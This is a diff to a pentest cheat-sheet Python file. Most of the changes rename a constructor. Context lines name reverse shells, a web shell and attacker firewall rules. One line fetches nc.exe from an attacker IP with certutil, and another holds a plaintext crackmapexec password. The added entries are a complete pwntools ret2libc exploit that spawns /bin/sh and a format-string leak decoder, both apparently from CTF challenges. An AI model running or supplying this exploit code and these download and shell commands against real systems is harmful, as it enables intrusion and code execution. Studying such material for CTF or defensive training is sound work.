@@ -45,8 +45,8 @@ Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
 ######################################
 ######################################
 
-icmp_reverse_shell_windows = Cheat(
-    "ICMP - Reverse Shell Windows / ToBase64String / FromBase64String (Nishang)"
+icmp_reverse_shell_windows = create_new_cheat(
+	"ICMP - Reverse Shell Windows / ToBase64String / FromBase64String (Nishang)"
 )
 icmp_reverse_shell_windows.category = "Windows"
 icmp_reverse_shell_windows.sub_category = "Reverse Shell"
@@ -100,8 +100,8 @@ cacls C:\PATH\File.ext
 ######################################
 ######################################
 
-alternative_data_streams = Cheat(
-    "Alternate Data Streams (MetaData), hide file in a file"
+alternative_data_streams = create_new_cheat(
+	"Alternate Data Streams (MetaData), hide file in a file"
 )
 alternative_data_streams.category = "Windows"
 alternative_data_streams.sub_category = "Utility"
@@ -124,8 +124,8 @@ type C:\Temp\\backup.zip:pass
 ######################################
 ######################################
 
-firewall_rules_change_to_accept_IP_Attacker = Cheat(
-    "Create new local user with administrator privilege - Firewall Rules - PostExploit"
+firewall_rules_change_to_accept_IP_Attacker = create_new_cheat(
+	"Create new local user with administrator privilege - Firewall Rules - PostExploit"
 )
 firewall_rules_change_to_accept_IP_Attacker.category = "Windows"
 firewall_rules_change_to_accept_IP_Attacker.sub_category = "PostExploit"
@@ -209,8 +209,8 @@ sudo restart ipsec
 ######################################
 ######################################
 
-file_transfere_windows_iwr = Cheat(
-    "File Transfere Windows - IWR - Invoke-WebRequest / IEX - WebClient downloadString / certutil.exe"
+file_transfere_windows_iwr = create_new_cheat(
+	"File Transfere Windows - IWR - Invoke-WebRequest / IEX - WebClient downloadString / certutil.exe"
 )
 file_transfere_windows_iwr.category = "Windows"
 file_transfere_windows_iwr.sub_category = "File Transfere"
@@ -233,8 +233,8 @@ certutil -urlcache -f http://10.10.14.53:80/nc.exe C:\Temp\\nc.exe
 ######################################
 ######################################
 
-file_transfere_windows_smbserver = Cheat(
-    "File Transfere Windows - SmbServer.py (Impacket)"
+file_transfere_windows_smbserver = create_new_cheat(
+	"File Transfere Windows - SmbServer.py (Impacket)"
 )
 file_transfere_windows_smbserver.category = "Windows"
 file_transfere_windows_smbserver.sub_category = "File Transfere"
@@ -302,8 +302,8 @@ crackmapexec winrm 10.10.10.193 -u 'svc-print' -p '$fab@s3Rv1ce$1'
 ######################################
 ######################################
 
-cewl = Cheat(
-    "cewl - Create a list of password (or something) from all words of a html page"
+cewl = create_new_cheat(
+	"cewl - Create a list of password (or something) from all words of a html page"
 )
 cewl.category = "Tools"
 cewl.sub_category = "Password"
@@ -614,8 +614,8 @@ done
 ######################################
 ######################################
 
-find_and_grep = Cheat(
-    "Find - Grep for Basic enumeration Linux (Clear Usernames or passes, SUID)"
+find_and_grep = create_new_cheat(
+	"Find - Grep for Basic enumeration Linux (Clear Usernames or passes, SUID)"
 )
 find_and_grep.category = "Linux"
 find_and_grep.sub_category = "Utility"
@@ -706,8 +706,8 @@ tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 # tcpdump tcp dst [ip] 
 ######################################
 ######################################
 
-capabilities = Cheat(
-    "Capabilities - setcap / getcap / setuid - Basic enumeration Linux"
+capabilities = create_new_cheat(
+	"Capabilities - setcap / getcap / setuid - Basic enumeration Linux"
 )
 capabilities.category = "Linux"
 capabilities.sub_category = "Enumeration"
@@ -722,8 +722,8 @@ setcap cap_setuid+ep /path/to/binary  # set uid for scale faster praticaly invis
 ######################################
 ######################################
 
-findSubDomain_dns = Cheat(
-    "nslookup / dig / dnsenum / virtual hosts - Get SubDomain - DNS"
+findSubDomain_dns = create_new_cheat(
+	"nslookup / dig / dnsenum / virtual hosts - Get SubDomain - DNS"
 )
 findSubDomain_dns.category = "Tools"
 findSubDomain_dns.sub_category = "DNS"
@@ -911,8 +911,8 @@ webShell.output = f"""[*] Web Shell em PHP
 ######################################
 ######################################
 
-fakeShell = Cheat(
-    "Fake Shell in bash for web shell with parameter and RCE - urlencoded"
+fakeShell = create_new_cheat(
+	"Fake Shell in bash for web shell with parameter and RCE - urlencoded"
 )
 fakeShell.category = "Web"
 fakeShell.sub_category = "RCE"
@@ -942,8 +942,8 @@ done
 ######################################
 ######################################
 
-treeWorpress = Cheat(
-    "Wordpress - WP - Tree/structure of basic wordpress path and files"
+treeWorpress = create_new_cheat(
+	"Wordpress - WP - Tree/structure of basic wordpress path and files"
 )
 treeWorpress.category = "Web"
 treeWorpress.sub_category = "CMS"
@@ -1465,8 +1465,8 @@ john --wordlist=/usr/share/wordlist/rockyou.txt hash
 ######################################
 ######################################
 
-sqsh = Cheat(
-    "sqsh - sqsh - Interactive database shell (mysql for 1433/tcp  open  ms-sql-s) - mssqlclient.py"
+sqsh = create_new_cheat(
+	"sqsh - sqsh - Interactive database shell (mysql for 1433/tcp  open  ms-sql-s) - mssqlclient.py"
 )
 sqsh.category = "Tools"
 sqsh.sub_category = "Databases"
@@ -1666,8 +1666,8 @@ upx executableFile
 ######################################
 ######################################
 
-kerbrute = Cheat(
-    "kerbrute / GetNPUsers.py - Enumerate Users from DC/AD Windows through Kerberos Pre-Authentication (AS-REP Roasting)"
+kerbrute = create_new_cheat(
+	"kerbrute / GetNPUsers.py - Enumerate Users from DC/AD Windows through Kerberos Pre-Authentication (AS-REP Roasting)"
 )
 kerbrute.category = "Windows"
 kerbrute.sub_category = "Kerberos"
@@ -2226,6 +2226,124 @@ python_encrypt_buffer_over_flow.output = """[*] Print special char for buffer ov
 python2 -c 'print(b"\\xef\\xbe\\xad\\xde")' | xxd
 perl -e 'print "\\xef\\xbe\\xad\\xde\\n"' | xxd
 python3 -c 'import sys;sys.stdout.buffer.write(b"\\xef\\xbe\\xad\\xde\\n")' | xxd
+"""
 
 
+######################################
+######################################
+
+ret2lib_example = create_new_cheat("ret2lib example - pwn - buffer overflow")
+ret2lib_example.category = "Python"
+ret2lib_example.sub_category = "pwntools"
+ret2lib_example.output = """[*] Script in python with an example of an exploit of ret2lib
+
+from pprint import pprint
+from pwn import *
+
+
+bin_path = "return-to-what"
+libc_path = "libc6_2.17-93ubuntu4_amd64.so"
+libc_path = "/usr/lib/x86_64-linux-gnu/libc.so.6"
+elf = ELF(bin_path)
+libc = ELF(libc_path)
+context.binary = elf
+context.arch = "amd64"
+
+
+# p = gdb.debug(bin_path, "c")
+p = elf.process()
+# p = remote("chal.duc.tf", 30003)
+
+p.recvuntil(b"\\n")
+p.recvuntil(b"\\n")
+
+
+# ****************************************************
+# Craft the payload with rop tool
+offset = 56
+
+rop = ROP(elf)
+rop.raw("\\0" * offset)
+rop.call(elf.symbols["puts"], [elf.got["puts"]])  # print (with puts function in C) the same puts function actual location in memory
+rop.call(elf.symbols["vuln"])                     # Return to buffer vulnerability to send more ROP instructions
+payload = rop.chain()                             # Build the payload (b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+\\x12@\\x00\\x00\\x00\\x00\\x00\\x18@@\\x00\\x00\\x00\\x00\\x000\\x10@\\x00\\x00\\x00\\x00\\x00\\x85\\x11@\\x00\\x00\\x00\\x00\\x00')
+p.sendline(payload)                               # Send payload...
+# ****************************************************
+
+
+# ****************************************************
+# Get and treat the response...
+res = p.recvline()
+puts = u64(res.rstrip().ljust(8, b"\\x00"))
+log.info(f"PUTS function is located at {hex(puts)}")
+
+p.recvline()
+
+
+# ****************************************************
+
+
+# ****************************************************
+# Craft the new rop for execute system command with libc
+libc.address = puts - libc.symbols["puts"]
+log.info(f"libc address determined to be {hex(libc.address)}")
+
+rop = ROP(libc)
+rop.raw("A" * offset)
+rop.call("system", [ next(libc.search(b"/bin/sh\\x00"))])
+rop.call("exit")
+payload = rop.chain()
+
+p.sendline(payload)
+
+p.interactive()
+"""
+
+######################################
+######################################
+
+get_clean_memleak = create_new_cheat("Clean a memory leak information - memleak cleaner")
+get_clean_memleak.category = "Python"
+get_clean_memleak.sub_category = "pwntools"
+get_clean_memleak.output = """[*] Clean a memory leak information - memleak cleaner
+
+from pwn import *
+
+
+def get_legible_info_from_memleak(raw_leak: str):
+	res = ''
+	raw_leak = raw_leak.replace("(nil)", "").split()
+	for element in raw_leak:
+		try:
+			res += p32(int(element, 16)).decode()
+		except:
+			pass
+	return res
+
+# def get_legible_info_from_memleak(raw_leak: str):
+
+# 	raw_leak = raw_leak.replace("(nil)", "").split()[::-1]
+
+# 	for i, element in enumerate(raw_leak):
+# 		raw_leak[i] = [element[i:i+2] for i in range(0, len(element), 2) if len(element[i:i+2]) == 2]
+
+
+# 	leak = []
+# 	for chars in raw_leak:
+# 		word = ""
+# 		for char in chars[::-1]:
+# 			try:
+# 				word += chr(int(char, 16))
+# 			except:
+# 				pass
+# 		leak.append(word)
+
+# 	return "".join(reversed(leak))
+
+# the memory leak used was %p %p %p %p %p %p %p... (percent char and "p" char with a space after, and repeat...)
+raw_leak = "0x57f6a1c0 0x170 0x56585d85 0x7 0x2a 0x26 0x1 0x2 0x5658696c 0x57f6a1c0 0x57f6a340 0x7b425448 0x5f796877 0x5f643164 0x34735f31 0x745f3376 0x665f3368 0x5f67346c 0x745f6e30 0x355f3368 0x6b633474 0x7d213f 0x2c681400 0xf7f6b3fc 0x56588f8c 0xffaccbc8 0x56586441 0x1 0xffaccc74 0xffaccc7c 0x2c681400 0xffaccbe0 (nil) (nil) 0xf7daef21 0xf7f6b000 0xf7f6b000 (nil) 0xf7daef21 0x1 0xffaccc74 0xffaccc7c 0xffaccc04 0x1 0xffaccc74 0xf7f6b000 0xf7f8870a 0xffaccc70 (nil) 0xf7f6b000 "
+
+print(get_legible_info_from_memleak(raw_leak))
+# ]XV*&liXVÀ¡öW@£öWHTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}h,ü³ö÷XVÈË¬ÿAdXVtÌ¬ÿ|Ì¬ÿh,àË¬ÿ!ïÚ÷°ö÷°ö÷!ïÚ÷tÌ¬ÿ|Ì¬ÿÌ¬ÿtÌ¬ÿ°ö÷
+ø÷pÌ¬ÿ°ö÷
 """
